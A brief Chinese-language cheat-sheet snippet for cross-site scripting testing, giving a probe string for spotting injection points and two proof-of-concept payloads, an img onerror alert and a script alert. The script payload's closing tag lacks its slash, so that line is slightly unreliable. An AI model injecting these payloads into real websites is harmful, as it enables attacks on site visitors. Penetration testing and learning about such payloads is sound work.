### xss探针

```
xss探针:';`"><aaa bbb=ccc>ddd<aaa/>
```

```
payload(这里由于可以控制标签，优先使用<img><script>):
对于<img src=x onerror=alert(1)>
```

```
<script>alert(1)<script>
```

